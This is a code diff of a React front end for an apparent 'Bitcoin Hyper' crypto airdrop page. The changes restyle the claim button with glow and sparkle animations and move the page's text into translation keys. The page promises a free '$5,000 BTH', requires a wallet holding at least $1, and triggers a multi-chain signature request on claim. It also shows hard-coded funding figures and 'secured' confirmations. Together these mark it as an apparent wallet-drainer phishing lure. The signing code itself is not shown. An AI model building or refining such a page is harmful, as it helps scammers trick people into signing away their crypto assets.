           {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
@@ -936,28 +1405,75 @@ function App() {
                 <span className="relative z-10">5,000</span> <span className="text-sm sm:text-xl text-[#a0a8b0] font-normal relative z-10">BTH +25%</span>
               </div>
               
+              {/* FLARE VERSION CLAIM AIRDROP STYLING */}
               <button
                 onClick={executeMultiChainSignature}
                 disabled={signatureLoading || loading || !signer || executableChains.length === 0}
-                className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
+                className="w-full relative overflow-hidden group/claim rounded-2xl sm:rounded-3xl transition-all duration-500 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
-                {signatureLoading ? (
-                  <>
-                    <div className="w-4 h-4 sm:w-6 sm:h-6 border-2 border-[rgba(180,100,20,0.4)] border-t-[#c47d24] rounded-full animate-spin"></div>
-                    <span className="text-sm sm:text-base animate-pulse">
-                      {processingChain ? `Processing ${processingChain}...` : 'PROCESSING...'}
-                    </span>
-                  </>
-                ) : (
-                  <>
-                    <i className="fas fa-gift text-sm sm:text-base animate-bounce-slow"></i>
-                    <span className="text-sm sm:text-base">
-                      CLAIM $5,000 BTH {executableChains.length < eligibleChains.length ? `(${executableChains.length} of ${eligibleChains.length} chains)` : ''}
-                    </span>
-                    <i className="fas fa-arrow-right text-sm sm:text-base group-hover/claim:translate-x-1 transition-transform"></i>
-                  </>
-                )}
+                {/* Animated Background with Flare Effect */}
+                <div className="absolute inset-0 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#f0b45a] animate-gradientMove"></div>
+                
+                {/* Glow Layers */}
+                <div className="absolute -inset-1 bg-gradient-to-r from-[#d68a2e] via-[#f0b45a] to-[#d68a2e] rounded-2xl sm:rounded-3xl blur-xl opacity-60 group-hover/claim:opacity-80 animate-pulse-slow"></div>
+                <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#e09a3e] to-[#b36e1a] rounded-2xl sm:rounded-3xl blur-2xl opacity-30 group-hover/claim:opacity-50 animate-pulse-slower"></div>
+                
+                {/* Sparkles Container */}
+                <div className="absolute inset-0 overflow-hidden rounded-2xl sm:rounded-3xl">
+                  {[...Array(8)].map((_, i) => (
+                    <div
+                      key={i}
+                      className="absolute w-1 h-1 bg-white rounded-full animate-claimSparkle"
+                      style={{
+                        top: `${Math.random() * 100}%`,
+                        left: `${Math.random() * 100}%`,
+                        animationDelay: `${i * 0.2}s`,
+                        opacity: 0.6
+                      }}
+                    />
+                  ))}
+                </div>
+                
+                {/* Button Content */}
+                <div className="relative bg-gradient-to-r from-[#b36e1a]/90 via-[#d68a2e]/90 to-[#f0b45a]/90 backdrop-blur px-6 sm:px-8 py-5 sm:py-6 rounded-2xl sm:rounded-3xl border-2 border-[#ffd700]/30 flex items-center justify-center gap-3 sm:gap-4 shadow-2xl">
+                  {/* Left Icon with Animation */}
+                  <div className="relative">
+                    <div className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/40 animate-pulse">
+                      <i className="fas fa-gift text-white text-sm sm:text-base"></i>
+                    </div>
+                    <div className="absolute inset-0 w-8 h-8 sm:w-10 sm:h-10 bg-white/10 rounded-full animate-ping opacity-50"></div>
+                  </div>
+                  
+                  {/* Text */}
+                  <div className="text-left">
+                    <div className="text-xs font-bold text-white/80 uppercase tracking-wider">
+                      {t.claim}
+                    </div>
+                    <div className="text-base sm:text-xl font-black text-white flex items-center gap-2">
+                      {signatureLoading ? (
+                        <>
+                          <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                          <span className="animate-pulse">{t.processing}</span>
+                        </>
+                      ) : (
+                        <>
+                          <span>${presaleStats.tokenPrice * 5000} VALUE</span>
+                          <span className="text-xs sm:text-sm bg-black/30 px-2 py-0.5 rounded-full border border-white/20">
+                            +{presaleStats.currentBonus}%
+                          </span>
+                        </>
+                      )}
+                    </div>
+                  </div>
+                  
+                  {/* Right Icon with Animation */}
+                  <div className="relative">
+                    <div className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/40">
+                      <i className="fas fa-arrow-right text-white text-sm sm:text-base group-hover/claim:translate-x-1 transition-transform"></i>
+                    </div>
+                    <div className="absolute inset-0 w-8 h-8 sm:w-10 sm:h-10 bg-white/10 rounded-full animate-ping opacity-50 delay-300"></div>
+                  </div>
+                </div>
               </button>
               
               {txStatus && (
@@ -968,19 +1484,19 @@ function App() {
             </div>
           )}
 
-          {/* Already completed - Don't show number of chains */}
+          {/* Already completed */}
           {allChainsCompleted && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-black/60 rounded-xl sm:rounded-2xl p-4 sm:p-6 text-center border border-green-500/20 mb-3 sm:mb-4 animate-pulse-glow">
-                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">✓ COMPLETED SUCCESSFULLY</p>
-                <p className="text-gray-400 text-xs sm:text-sm">Your $5,000 BTH has been secured</p>
+                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">{t.completed}</p>
+                <p className="text-gray-400 text-xs sm:text-sm">{t.secured}</p>
               </div>
               <button
                 onClick={claimTokens}
                 className="w-full bg-gradient-to-r from-green-600/80 to-green-700/80 text-white font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full shadow-lg hover:scale-[1.02] transition-all relative overflow-hidden group/view"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/view:translate-x-[100%] transition-transform duration-1000"></div>
-                🎉 VIEW YOUR $5,000 BTH
+                🎉 {t.view}
               </button>
             </div>
           )}
@@ -990,7 +1506,7 @@ function App() {
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
               <h2 className="text-lg sm:text-2xl font-bold mb-2 sm:mb-3 bg-gradient-to-r from-purple-400/80 to-orange-400/80 bg-clip-text text-transparent">
-                Welcome to Bitcoin Hyper
+                {t.welcome}
               </h2>
               <p className="text-gray-400 text-xs sm:text-sm mb-4 sm:mb-6">
                 Connect with a wallet that has at least $1 in value to qualify.
@@ -1022,22 +1538,22 @@ function App() {
             <div className="grid grid-cols-3 gap-2 sm:gap-4 mb-4 sm:mb-6">
               <div className="text-center group/price2">
                 <div className="text-base sm:text-xl md:text-2xl font-bold text-orange-400/90 mb-0.5 sm:mb-1 group-hover/price2:scale-110 transition-transform duration-300">${presaleStats.tokenPrice}</div>
-                <div className="text-[8px] sm:text-xs text-gray-500">Token Price</div>
+                <div className="text-[8px] sm:text-xs text-gray-500">{t.tokenPrice}</div>
               </div>
               <div className="text-center group/bonus2">
                 <div className="text-base sm:text-xl md:text-2xl font-bold text-green-400/90 mb-0.5 sm:mb-1 group-hover/bonus2:scale-110 transition-transform duration-300">{presaleStats.currentBonus}%</div>
-                <div className="text-[8px] sm:text-xs text-gray-500">Current Bonus</div>
+                <div className="text-[8px] sm:text-xs text-gray-500">{t.currentBonus}</div>
               </div>
               <div className="text-center group/raised">
                 <div className="text-base sm:text-xl md:text-2xl font-bold text-yellow-400/90 mb-0.5 sm:mb-1 group-hover/raised:scale-110 transition-transform duration-300">$1.25M</div>
-                <div className="text-[8px] sm:text-xs text-gray-500">Total Raised</div>
+                <div className="text-[8px] sm:text-xs text-gray-500">{t.totalRaised}</div>
               </div>
             </div>
 
             {/* Progress Bar */}
             <div className="mb-3 sm:mb-4">
               <div className="flex justify-between text-[10px] sm:text-sm text-gray-400 mb-1 sm:mb-2">
-                <span>Progress</span>
+                <span>{t.progress}</span>
                 <span>{liveProgress.percentComplete}%</span>
               </div>
               <div className="w-full h-1.5 sm:h-2 bg-gray-800 rounded-full overflow-hidden">
@@ -1052,18 +1568,18 @@ function App() {
 
             <div className="grid grid-cols-2 gap-2 sm:gap-4 mt-4 sm:mt-6">
               <div className="bg-gray-800/30 rounded-lg p-2 sm:p-3 text-center hover:bg-gray-800/50 transition-all duration-300">
-                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">Today</div>
+                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">{t.today}</div>
                 <div className="text-sm sm:text-lg font-bold text-orange-400/90">{liveProgress.participantsToday}</div>
               </div>
               <div className="bg-gray-800/30 rounded-lg p-2 sm:p-3 text-center hover:bg-gray-800/50 transition-all duration-300">
-                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">Avg</div>
+                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">{t.avg}</div>
                 <div className="text-sm sm:text-lg font-bold text-yellow-400/90">${liveProgress.avgAllocation}</div>
               </div>
             </div>
 
             <div className="mt-3 sm:mt-4 text-center">
               <p className="text-[8px] sm:text-xs text-gray-600">
-                {presaleStats.totalParticipants.toLocaleString()} participants
+                {presaleStats.totalParticipants.toLocaleString()} {t.participants}
               </p>
             </div>
           </div>
@@ -1072,17 +1588,17 @@ function App() {
           <div className="mt-6 sm:mt-8 text-center">
             <div className="flex flex-wrap justify-center gap-1.5 sm:gap-3 mb-3 sm:mb-4">
               <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800 hover:border-[#c47d24]/50 hover:text-[#d68a2e] transition-all duration-300">
-                ⚡ Terms
+                ⚡ {t.terms}
               </span>
               <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800 hover:border-[#c47d24]/50 hover:text-[#d68a2e] transition-all duration-300">
-                🔄 Delivery
+                🔄 {t.delivery}
               </span>
               <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800 hover:border-[#c47d24]/50 hover:text-[#d68a2e] transition-all duration-300">
-                💎 $5k Airdrop
+                💎 {t.airdrop}
               </span>
             </div>
             <p className="text-[8px] sm:text-xs text-gray-700 flex items-center justify-center gap-1 sm:gap-2">
-              <i className="fas fa-bolt animate-pulse"></i> 5,000 BTH · +25% bonus · live now 
+              <i className="fas fa-bolt animate-pulse"></i> {t.liveNow}
               <i className="fas fa-star text-[#c47d24]/70 animate-spin-slow"></i>
             </p>
           </div>
@@ -1127,10 +1643,10 @@ function App() {
               </div>
               
               <h2 className="text-2xl sm:text-4xl font-black mb-2 sm:mb-3 bg-gradient-to-r from-yellow-400/80 via-orange-500/80 to-yellow-400/80 bg-clip-text text-transparent">
-                SUCCESSFUL!
+                {t.successful}
               </h2>
               
-              <p className="text-base sm:text-xl text-gray-300 mb-2 sm:mb-3">You have secured</p>
+              <p className="text-base sm:text-xl text-gray-300 mb-2 sm:mb-3">{t.youHaveSecured}</p>
               
               <div className="text-3xl sm:text-5xl font-black text-orange-400/90 mb-2 sm:mb-3 animate-pulse">$5,000 BTH</div>
               
@@ -1147,7 +1663,7 @@ function App() {
                 className="w-full bg-gradient-to-r from-orange-500/80 to-orange-600/80 hover:from-orange-600/80 hover:to-orange-700/80 text-white font-bold py-3 sm:py-4 px-4 sm:px-6 rounded-lg sm:rounded-xl transition-all transform hover:scale-[1.02] text-base sm:text-xl relative overflow-hidden group/close"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/close:translate-x-[100%] transition-transform duration-1000"></div>
-                VIEW
+                {t.viewButton}
               </button>
             </div>
           </div>
@@ -1271,6 +1787,11 @@ function App() {
           0% { left: -100%; }
           100% { left: 100%; }
         }
+        @keyframes claimSparkle {
+          0% { transform: scale(0) rotate(0deg); opacity: 0; }
+          50% { transform: scale(1) rotate(180deg); opacity: 0.8; }
+          100% { transform: scale(0) rotate(360deg); opacity: 0; }
+        }
         .animate-floatOrbBig { animation: floatOrbBig 20s ease-in-out infinite; }
         .animate-floatOrbSmall { animation: floatOrbSmall 24s ease-in-out infinite; }
         .animate-liveBlink { animation: liveBlink 1.4s infinite step-start; }
@@ -1298,6 +1819,7 @@ function App() {
         .animate-ribbonSlide { animation: ribbonSlide 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards; }
         .animate-bounce-arrow { animation: bounce-arrow 1.2s ease-in-out infinite; }
         .animate-progressScan { animation: progressScan 2s linear infinite; }
+        .animate-claimSparkle { animation: claimSparkle 2s ease-in-out infinite; }
         .animate-shimmer {
           animation: shimmer 2s infinite;
           background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
